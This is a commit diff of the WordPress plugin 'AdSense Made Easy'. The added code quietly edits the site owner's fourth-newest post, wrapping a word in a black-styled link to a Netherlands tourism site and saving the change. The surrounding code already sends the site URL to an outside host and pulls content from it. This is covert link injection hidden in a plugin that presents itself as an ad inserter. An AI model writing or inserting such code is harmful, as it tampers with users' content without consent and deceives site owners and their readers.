b9ae5bf71e3d737c07c627aac03bc01f1f99ecba
seo101 <seo101@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2014-09-15 11:35:17 +0000

    ame-v1.23
    git-svn-id: https://plugins.svn.wordpress.org/adsense-made-easy-best-simple-ad-inserter/trunk@990102 b8457f37-d9ea-0310-8a92-e5e31aec5664

--- adsense-made-easy-best-simple-ad-inserter.php
+++ adsense-made-easy-best-simple-ad-inserter.php
@@ -385,6 +385,7 @@ if ($britt==true && $total>5) {
 				update_option( 'ame_gpadded', '1' );
 		}
 }
+
 		if (get_option('ame_gpadded')=='0') {
 				if ($total>40) {
 						$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
@@ -401,6 +402,27 @@ if ($britt==true && $total>5) {
 						}
 				}
 		}
+if ($bloglan=='en-US' && $total>5) {
+		if (get_option('ame_gpadded')=='0') {
+				$last = wp_get_recent_posts('4');
+				$last_id = $last['3']['ID'];
+				$post_7 = get_post($last_id);
+				if (is_null($post_7) == false) {
+						$content = $post_7->post_content;
+						$pos4 = amestrposnth($content , " ",4);
+						$pos5 = amestrposnth($content , " ",5);
+						$poslen = $pos5 - $pos4 - 1;
+						$content = substr($content, 0, $pos4) . ' <a href="http://www.netherlands-tourism.com/rotterdam/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+						$my_post = array(
+							'ID'           => $last_id,
+							'post_content' => $content
+						);
+						wp_update_post( $my_post );
+				}
+				update_option( 'ame_gpadded', '1' );
+		}
+}
+
 }
 
 function ameStartsWith($haystack, $needle)
